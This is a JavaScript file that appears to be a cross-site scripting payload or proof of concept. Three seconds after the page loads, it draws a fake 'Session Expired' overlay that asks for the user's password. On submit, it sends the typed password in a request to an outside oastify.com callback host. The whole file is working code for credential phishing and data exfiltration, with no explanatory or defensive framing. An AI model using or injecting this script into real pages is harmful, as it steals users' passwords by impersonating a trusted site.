console.log("Script started"); // Confirm the script runs at all

window.addEventListener('load', function() {
    console.log("Window loaded"); // Confirm the load event fires
    
    setTimeout(function() {
        console.log("Timeout triggered"); // Confirm the timeout executes
        
        // Create and append the message div
        let message = document.createElement('div');
        message.style.position = 'fixed';
        message.style.top = '30%';
        message.style.left = '50%';
        message.style.transform = 'translate(-50%, -50%)';
        message.style.background = 'white';
        message.style.padding = '20px';
        message.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
        message.style.zIndex = '9999';
        message.style.display = 'block';
        message.innerHTML = `
            <h2>Session Expired</h2>
            <p>Please re-enter your password:</p>
            <input type="password" id="password" placeholder="Enter password" required>
            <button id="submit">Submit</button>
        `;
        
        document.body.appendChild(message);
        console.log("Prompt appended to DOM"); // Confirm the div is added
        
        // Add the submit handler
        document.getElementById('submit').addEventListener('click', function() {
            console.log("Submit clicked"); // Confirm the click works
            let password = document.getElementById('password').value;
            if (password) {
                console.log("Sending fetch with password:", password);
                fetch(`https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`, {
                    method: 'GET',
                    mode: 'no-cors'
                })
                .then(() => {
                    console.log("Fetch succeeded");
                    message.innerHTML = "<p>Loading...</p>";
                })
                .catch(error => {
                    console.error("Fetch failed:", error);
                    message.innerHTML = "<p>Error occurred.</p>";
                });
            }
        });
    }, 3000);
});
